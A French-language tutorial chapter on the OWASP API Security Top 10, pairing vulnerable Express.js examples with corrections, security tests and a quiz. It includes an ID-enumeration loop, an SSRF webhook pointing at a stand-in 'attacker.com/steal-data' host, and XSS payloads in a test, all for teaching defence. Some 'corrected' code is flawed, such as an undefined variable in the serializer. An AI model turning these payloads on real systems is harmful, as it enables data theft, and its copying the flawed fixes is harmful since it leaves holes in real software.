# Vulnérabilités OWASP API

## Introduction

L'**OWASP** (Open Web Application Security Project) publie régulièrement les **Top 10** des vulnérabilités de sécurité les plus critiques pour les applications web et les APIs. Dans ce chapitre, nous allons explorer ces vulnérabilités spécifiques aux APIs, apprendre à les identifier et à les corriger. La sécurité n'est pas une option : elle doit être intégrée dès la conception de votre API.

## OWASP API Security Top 10 (2023)

### 1. Broken Object Level Authorization (BOLA)

#### Description
Les utilisateurs peuvent accéder ou modifier des **ressources** qui ne leur appartiennent pas en manipulant les identifiants.

```javascript
// ❌ Vulnérabilité BOLA
GET /api/users/123    // Utilisateur authentifié en tant que User A
GET /api/users/456    // Peut accéder aux données de User B !

// ❌ Modification non autorisée
PUT /api/users/789/profile  // Modifier le profil d'un autre utilisateur
```

#### Exploitation

```javascript
// Attaquant découvre les IDs
for (let id = 1; id < 1000; id++) {
  fetch(`/api/users/${id}`)
    .then(response => {
      if (response.ok) {
        console.log(`User ${id} exists:`, response.json());
      }
    });
}
```

#### Correction

```javascript
// ✅ Vérification de propriété
app.get('/api/users/:id', authenticateToken, (req, res) => {
  const requestedUserId = req.params.id;
  const currentUserId = req.user.id;

  // Vérifier que l'utilisateur accède à ses propres données
  if (requestedUserId !== currentUserId && req.user.role !== 'admin') {
    return res.status(403).json({
      error: 'Access denied',
      message: 'You can only access your own data'
    });
  }

  const user = getUserById(requestedUserId);
  res.json(user);
});

// ✅ Vérification pour les admins
app.get('/api/admin/users/:id', authenticateToken, requireRole(['admin']), (req, res) => {
  const user = getUserById(req.params.id);
  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }
  res.json(user);
});
```

### 2. Broken Authentication

#### Description
Mécanismes d'**authentification** défaillants qui permettent aux attaquants de compromettre des comptes.

```javascript
// ❌ Vulnérabilités d'authentification
// 1. Pas de rate limiting
POST /api/auth/login  // Attaque par force brute

// 2. Tokens non validés
GET /api/profile
Authorization: Bearer invalid-token  // Token invalide accepté

// 3. Sessions non expirées
GET /api/admin  // Session expirée encore valide
```

#### Correction

```javascript
// ✅ Rate limiting sur l'authentification
const authRateLimit = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5, // 5 tentatives par 15 minutes
  message: 'Too many login attempts',
  standardHeaders: true,
  skipSuccessfulRequests: true
});

app.post('/api/auth/login', authRateLimit, async (req, res) => {
  const { email, password } = req.body;

  try {
    const user = await authenticateUser(email, password);

    // Invalider les tentatives précédentes
    clearFailedAttempts(email);

    const token = generateSecureJWT(user);
    res.json({ token, user });
  } catch (error) {
    // Enregistrer la tentative échouée
    recordFailedAttempt(email);

    res.status(401).json({
      error: 'Invalid credentials',
      attemptsRemaining: getRemainingAttempts(email)
    });
  }
});

// ✅ Validation stricte des tokens
const authenticateToken = (req, res, next) => {
  const token = req.headers['authorization']?.split(' ')[1];

  if (!token) {
    return res.status(401).json({ error: 'Token required' });
  }

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET, {
      issuer: 'my-api',
      audience: 'my-clients',
      algorithms: ['HS256']
    });

    // Vérifier que le token n'est pas révoqué
    if (isTokenRevoked(decoded.jti)) {
      throw new Error('Token revoked');
    }

    req.user = decoded;
    next();
  } catch (error) {
    res.status(401).json({
      error: 'Invalid token',
      message: error.message
    });
  }
};
```

### 3. Broken Object Property Level Authorization

#### Description
Les utilisateurs peuvent voir ou modifier des **propriétés sensibles** d'objets qu'ils ne devraient pas pouvoir accéder.

```javascript
// ❌ Exposition de données sensibles
GET /api/users/123
{
  "id": 123,
  "email": "user@example.com",
  "isAdmin": true,           // Visible par tous !
  "creditCard": "4111...",   // Données financières !
  "ssn": "123-45-6789"       // Numéro de sécurité sociale !
}
```

#### Correction

```javascript
// ✅ Filtrage des propriétés sensibles
const getUserProfile = (userId, requestingUser) => {
  const user = getUserById(userId);

  if (userId !== requestingUser.id && requestingUser.role !== 'admin') {
    // Retourner seulement les informations publiques
    return {
      id: user.id,
      name: user.name,
      avatar: user.avatar,
      bio: user.bio,
      // Pas d'email, téléphone, etc.
    };
  }

  // Utilisateur accède à ses propres données
  return user;
};

// ✅ Sérialisation conditionnelle
const serializeUser = (user, requestingUser) => {
  const baseUser = {
    id: user.id,
    name: user.name,
    createdAt: user.createdAt
  };

  if (userId === requestingUser.id) {
    // Données personnelles
    return {
      ...baseUser,
      email: user.email,
      phone: user.phone,
      preferences: user.preferences
    };
  }

  if (requestingUser.role === 'admin') {
    // Données admin
    return {
      ...baseUser,
      email: user.email,
      role: user.role,
      lastLogin: user.lastLogin,
      isActive: user.isActive
    };
  }

  // Données publiques seulement
  return baseUser;
};
```

### 4. Unrestricted Resource Consumption

#### Description
**Consommation illimitée** de ressources qui peut mener à un déni de service.

```javascript
// ❌ Ressources non limitées
GET /api/users           // Retourne TOUS les utilisateurs
GET /api/reports?limit=1000000  // Requête massive
POST /api/upload         // Upload sans limite de taille
```

#### Correction

```javascript
// ✅ Pagination obligatoire
app.get('/api/users', (req, res) => {
  const limit = Math.min(parseInt(req.query.limit) || 20, 100);
  const offset = parseInt(req.query.offset) || 0;

  if (limit > 100) {
    return res.status(400).json({
      error: 'Limit too high',
      message: 'Maximum limit is 100 items'
    });
  }

  const users = getUsers({ limit, offset });
  res.json({
    data: users,
    pagination: { limit, offset, total: getTotalUsers() }
  });
});

// ✅ Limitation des uploads
const upload = multer({
  limits: {
    fileSize: 5 * 1024 * 1024, // 5MB max
    files: 1, // 1 fichier max
    fields: 10 // 10 champs max
  },
  fileFilter: (req, file, cb) => {
    // Types de fichiers autorisés
    const allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
    if (allowedTypes.includes(file.mimetype)) {
      cb(null, true);
    } else {
      cb(new Error('Invalid file type'));
    }
  }
});

app.post('/api/upload', upload.single('file'), (req, res) => {
  // Traitement du fichier uploadé
  res.json({ message: 'File uploaded successfully' });
});
```

### 5. Broken Function Level Authorization

#### Description
**Contrôle d'accès** insuffisant sur les fonctions et endpoints administratifs.

```javascript
// ❌ Fonctions admin accessibles à tous
GET /api/admin/users         // Pas de vérification de rôle
DELETE /api/admin/users/123  // N'importe qui peut supprimer
POST /api/admin/settings     // Modification des paramètres système
```

#### Correction

```javascript
// ✅ Middleware d'autorisation par fonction
const requireAdmin = requireRole(['admin']);
const requireModerator = requireRole(['admin', 'moderator']);
const requirePremium = requireTier(['premium', 'enterprise']);

// ✅ Endpoints protégés par fonction
app.get('/api/admin/users', authenticateToken, requireAdmin, getAllUsers);
app.delete('/api/admin/users/:id', authenticateToken, requireAdmin, deleteUser);
app.post('/api/admin/system/restart', authenticateToken, requireAdmin, restartSystem);

// ✅ Vérification des permissions par action
const checkPermission = (action, resource) => {
  return (req, res, next) => {
    if (!req.user) {
      return res.status(401).json({ error: 'Authentication required' });
    }

    const hasPermission = checkUserPermission(req.user, action, resource);
    if (!hasPermission) {
      return res.status(403).json({
        error: 'Insufficient permissions',
        message: `Required permission: ${action}:${resource}`
      });
    }

    next();
  };
};

// ✅ Usage
app.delete('/api/posts/:id', authenticateToken, checkPermission('delete', 'posts'), deletePost);
app.put('/api/users/:id/role', authenticateToken, checkPermission('manage', 'users'), changeUserRole);
```

### 6. Unrestricted Access to Sensitive Business Flows

#### Description
**Flux métier sensibles** accessibles sans restrictions appropriées.

```javascript
// ❌ Flux de paiement accessible à tous
POST /api/payments/process     // Traitement sans vérification
GET /api/payments/history      // Historique visible par tous
POST /api/transfers/initiate   // Transferts sans autorisation
```

#### Correction

```javascript
// ✅ Vérification de propriété pour les paiements
app.get('/api/payments/history', authenticateToken, (req, res) => {
  const userId = req.user.id;

  // Vérifier que l'utilisateur ne voit que SES paiements
  const payments = getPaymentsByUserId(userId);
  res.json({ payments });
});

// ✅ Validation métier pour les transferts
app.post('/api/transfers', authenticateToken, async (req, res) => {
  const { amount, recipientId } = req.body;
  const senderId = req.user.id;

  // Vérifications métier
  if (amount <= 0 || amount > 10000) {
    return res.status(400).json({
      error: 'Invalid amount',
      message: 'Amount must be between 0 and 10,000'
    });
  }

  if (senderId === recipientId) {
    return res.status(400).json({
      error: 'Invalid recipient',
      message: 'Cannot transfer to yourself'
    });
  }

  const sender = getUserById(senderId);
  if (sender.balance < amount) {
    return res.status(400).json({
      error: 'Insufficient funds'
    });
  }

  // Traitement du transfert
  const transfer = await processTransfer(senderId, recipientId, amount);
  res.status(201).json({ transfer });
});
```

### 7. Server Side Request Forgery (SSRF)

#### Description
L'API effectue des **requêtes HTTP** vers des URLs contrôlées par l'attaquant.

```javascript
// ❌ SSRF vulnérabilité
POST /api/fetch-url
{
  "url": "http://internal-server.internal/api/admin"
}

POST /api/webhook
{
  "callback": "http://attacker.com/steal-data"
}
```

#### Correction

```javascript
// ✅ Liste blanche des URLs autorisées
const allowedDomains = [
  'api.github.com',
  'api.twitter.com',
  'my-partner-api.com'
];

const validateURL = (url) => {
  try {
    const parsed = new URL(url);

    if (!allowedDomains.includes(parsed.hostname)) {
      throw new Error('Domain not allowed');
    }

    if (parsed.protocol !== 'https:') {
      throw new Error('Only HTTPS allowed');
    }

    return parsed;
  } catch (error) {
    throw new Error('Invalid URL');
  }
};

// ✅ Fetch sécurisé
app.post('/api/fetch-data', authenticateToken, async (req, res) => {
  const { url } = req.body;

  try {
    const validatedUrl = validateURL(url);

    const response = await fetch(validatedUrl, {
      timeout: 5000, // Timeout de 5 secondes
      headers: {
        'User-Agent': 'MyAPI/1.0'
      },
      // Désactiver les redirections
      redirect: 'manual'
    });

    const data = await response.text();
    res.json({ data });
  } catch (error) {
    res.status(400).json({
      error: 'Invalid request',
      message: error.message
    });
  }
});
```

### 8. Security Misconfiguration

#### Description
**Configuration de sécurité** inadéquate ou incomplète.

```javascript
// ❌ Configurations de sécurité manquantes
app.use(cors({ origin: '*' }));           // CORS trop permissif
app.use(helmet());                        // Headers de sécurité manquants
// Pas de rate limiting
// Pas de validation d'entrée
// Logs verbeux en production
```

#### Correction

```javascript
// ✅ Configuration de sécurité complète
const helmet = require('helmet');

// Headers de sécurité
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"]
    }
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  },
  noSniff: true,
  frameguard: { action: 'deny' },
  xssFilter: true
}));

// ✅ CORS restrictif
app.use('/api', cors({
  origin: ['https://myapp.com', 'https://admin.myapp.com'],
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-API-Key'],
  maxAge: 86400
}));

// ✅ Rate limiting global
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  message: 'Too many requests'
});

app.use('/api', limiter);

// ✅ Validation d'entrée
const validateInput = (req, res, next) => {
  // Supprimer les propriétés null/undefined
  Object.keys(req.body).forEach(key => {
    if (req.body[key] === null || req.body[key] === undefined) {
      delete req.body[key];
    }
  });

  // Sanitisation des chaînes
  Object.keys(req.body).forEach(key => {
    if (typeof req.body[key] === 'string') {
      req.body[key] = req.body[key].trim();
    }
  });

  next();
};

app.use('/api', validateInput);
```

### 9. Improper Assets Management

#### Description
**Gestion inadéquate** des versions d'API et des actifs exposés.

```javascript
// ❌ Exposition d'informations sensibles
GET /api/v1/debug          // Endpoint de debug en production
GET /api/.env              // Fichier d'environnement accessible
GET /api/package.json      // Informations sur les dépendances
GET /api/admin             // Panel admin non protégé
```

#### Correction

```javascript
// ✅ Suppression des endpoints de debug
if (process.env.NODE_ENV === 'production') {
  app.get('/api/debug', (req, res) => {
    res.status(404).json({ error: 'Not found' });
  });

  app.get('/api/.env', (req, res) => {
    res.status(404).json({ error: 'Not found' });
  });

  // Suppression du middleware de logging verbeux
  app.use(morgan('combined', {
    skip: (req, res) => res.statusCode < 400
  }));
}

// ✅ Gestion des versions d'API
app.get('/api/v1/*', (req, res, next) => {
  const deprecationDate = new Date('2023-12-31');

  if (new Date() > deprecationDate) {
    return res.status(410).json({
      error: 'API version removed',
      message: 'This API version has been permanently removed'
    });
  }

  res.set('Warning', '299 "API v1 deprecated"');
  next();
});

// ✅ Inventaire des actifs
const apiInventory = {
  endpoints: [
    '/api/v2/users',
    '/api/v2/posts',
    '/api/v2/auth/login'
  ],
  versions: [
    { version: 'v2', status: 'current' },
    { version: 'v1', status: 'deprecated' }
  ],
  dependencies: [
    'express:4.18.0',
    'jsonwebtoken:9.0.0',
    'bcrypt:5.1.0'
  ]
};

app.get('/api/inventory', authenticateToken, requireRole(['admin']), (req, res) => {
  res.json(apiInventory);
});
```

### 10. Insufficient Logging and Monitoring

#### Description
**Logging et monitoring** insuffisants pour détecter et répondre aux incidents de sécurité.

```javascript
// ❌ Logging insuffisant
app.use((error, req, res, next) => {
  console.log('Error:', error.message);  // Pas assez détaillé
  res.status(500).json({ error: 'Internal error' });
});
```

#### Correction

```javascript
// ✅ Logging de sécurité complet
const securityLogger = {
  logAuthEvent: (type, req, details) => {
    const event = {
      timestamp: new Date().toISOString(),
      type,
      ip: req.ip,
      userAgent: req.get('User-Agent'),
      userId: req.user?.id,
      endpoint: req.originalUrl,
      method: req.method,
      ...details
    };

    console.log(JSON.stringify(event));

    // Stockage persistant
    saveSecurityEvent(event);

    // Alertes pour les événements critiques
    if (type === 'AUTH_FAILURE' || type === 'SUSPICIOUS_ACTIVITY') {
      sendSecurityAlert(event);
    }
  },

  logAccessEvent: (req, res) => {
    if (res.statusCode >= 400) {
      securityLogger.logAuthEvent('ACCESS_DENIED', req, {
        statusCode: res.statusCode,
        error: res.error
      });
    }
  },

  logDataAccess: (req, resource, action) => {
    securityLogger.logAuthEvent('DATA_ACCESS', req, {
      resource,
      action,
      resourceId: req.params.id
    });
  }
};

// ✅ Middleware de logging
app.use((req, res, next) => {
  req.startTime = Date.now();
  next();
});

app.use((req, res, next) => {
  res.on('finish', () => {
    securityLogger.logAccessEvent(req, res);
  });
  next();
});

// ✅ Logging des événements d'authentification
app.post('/api/auth/login', authRateLimit, async (req, res) => {
  const { email } = req.body;

  try {
    const user = await authenticateUser(email, req.body.password);

    securityLogger.logAuthEvent('AUTH_SUCCESS', req, {
      userId: user.id,
      method: 'password'
    });

    const token = generateJWT(user);
    res.json({ token, user });
  } catch (error) {
    securityLogger.logAuthEvent('AUTH_FAILURE', req, {
      email,
      reason: error.message
    });

    res.status(401).json({ error: 'Invalid credentials' });
  }
});

// ✅ Monitoring des accès aux données sensibles
app.get('/api/users/:id', authenticateToken, (req, res) => {
  securityLogger.logDataAccess(req, 'user', 'read');

  const user = getUserById(req.params.id);
  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }

  res.json(serializeUser(user, req.user));
});
```

## Tests de sécurité

### Tests automatisés

```javascript
// tests/security.test.js
const request = require('supertest');
const app = require('../app');

describe('API Security', () => {
  describe('BOLA Prevention', () => {
    test('should prevent access to other users data', async () => {
      const userToken = generateToken({ id: 123, role: 'user' });

      const response = await request(app)
        .get('/api/users/456')
        .set('Authorization', `Bearer ${userToken}`)
        .expect(403);

      expect(response.body.error).toBe('Access denied');
    });

    test('should allow admin access to all users', async () => {
      const adminToken = generateToken({ id: 1, role: 'admin' });

      const response = await request(app)
        .get('/api/users/456')
        .set('Authorization', `Bearer ${adminToken}`)
        .expect(200);

      expect(response.body.id).toBe(456);
    });
  });

  describe('Rate Limiting', () => {
    test('should limit anonymous requests', async () => {
      const requests = [];

      // Faire plus de requêtes que la limite
      for (let i = 0; i < 110; i++) {
        requests.push(
          request(app)
            .get('/api/users')
            .expect(i < 100 ? 200 : 429)
        );
      }

      const responses = await Promise.all(requests);
      const rateLimited = responses.filter(r => r.status === 429);
      expect(rateLimited.length).toBeGreaterThan(0);
    });
  });

  describe('Input Validation', () => {
    test('should reject malicious input', async () => {
      const maliciousInput = {
        email: 'test@example.com',
        bio: '<script>alert("xss")</script>',
        website: 'javascript:alert("xss")'
      };

      const response = await request(app)
        .post('/api/users')
        .send(maliciousInput)
        .expect(400);

      expect(response.body.error).toBe('validation_error');
    });
  });

  describe('Authentication', () => {
    test('should require valid token', async () => {
      const response = await request(app)
        .get('/api/profile')
        .expect(401);

      expect(response.body.error).toBe('Token required');
    });

    test('should reject expired tokens', async () => {
      const expiredToken = jwt.sign(
        { userId: 123 },
        process.env.JWT_SECRET,
        { expiresIn: '-1h' }
      );

      const response = await request(app)
        .get('/api/profile')
        .set('Authorization', `Bearer ${expiredToken}`)
        .expect(401);

      expect(response.body.error).toBe('Invalid token');
    });
  });
});
```

### Outils de sécurité

```javascript
// ✅ Outils de test de sécurité
const securityTools = {
  // Scanning des vulnérabilités
  vulnerabilityScan: async () => {
    const vulnerabilities = [];

    // Test BOLA
    const bolaTest = await testBOLA();
    if (bolaTest.vulnerable) {
      vulnerabilities.push(bolaTest);
    }

    // Test injection
    const injectionTest = await testInjection();
    if (injectionTest.vulnerable) {
      vulnerabilities.push(injectionTest);
    }

    // Test XSS
    const xssTest = await testXSS();
    if (xssTest.vulnerable) {
      vulnerabilities.push(xssTest);
    }

    return vulnerabilities;
  },

  // Test de pénétration automatisé
  penetrationTest: async () => {
    const endpoints = getAllEndpoints();
    const results = [];

    for (const endpoint of endpoints) {
      const testResult = await testEndpoint(endpoint);
      results.push(testResult);
    }

    return results;
  }
};
```

## Quiz OWASP API

**Question 1** : Quelle est la vulnérabilité la plus courante dans les APIs ?
**Réponse** : Broken Object Level Authorization (BOLA/IDOR)

**Question 2** : Comment corriger une vulnérabilité SSRF ?
**Réponse** : Utiliser une liste blanche d'URLs autorisées et valider les URLs

**Question 3** : Pourquoi le logging de sécurité est important ?
**Réponse** : Pour détecter les attaques, analyser les incidents et répondre aux menaces

## En résumé

### OWASP API Security Top 10
1. **BOLA** : Vérifier la propriété des ressources
2. **Broken Auth** : Authentification robuste et rate limiting
3. **Property Auth** : Filtrage des données sensibles
4. **Resource Consumption** : Pagination et limites
5. **Function Auth** : Contrôle d'accès par fonction
6. **Business Flows** : Validation des flux métier
7. **SSRF** : Liste blanche des URLs
8. **Misconfiguration** : Configuration de sécurité complète
9. **Assets Management** : Gestion des versions et actifs
10. **Logging** : Monitoring et logging de sécurité

### Bonnes pratiques de sécurité
- ✅ **Authentification** multi-facteurs
- ✅ **Autorisation** par rôle et permission
- ✅ **Validation** de toutes les entrées
- ✅ **Rate limiting** adaptatif
- ✅ **Logging** complet des événements
- ✅ **Tests** de sécurité automatisés

### Checklist de sécurité
```javascript
// Sécurité implémentée
✅ Authentification JWT
✅ Autorisation RBAC/ABAC
✅ CORS configuré
✅ Rate limiting
✅ Validation d'entrée
✅ Sanitisation des données
✅ HTTPS/TLS
✅ Headers de sécurité
✅ Logging de sécurité
✅ Tests de sécurité
```

### Outils de sécurité
- 🛡️ **OWASP ZAP** : Scanner de vulnérabilités
- 📊 **Burp Suite** : Proxy et scanner
- 🔍 **Postman** : Tests d'API
- 📝 **Jest/Supertest** : Tests automatisés
- 🚨 **ELK Stack** : Logging et monitoring

Félicitations ! Vous avez maintenant une compréhension complète de la sécurité des APIs. Dans la prochaine section, nous verrons comment **mettre en œuvre** ces concepts dans différents frameworks et langages !

---

**Prochain chapitre** : [01-API-avec-Node-Express](05-Mise-en-œuvre/01-API-avec-Node-Express.md)
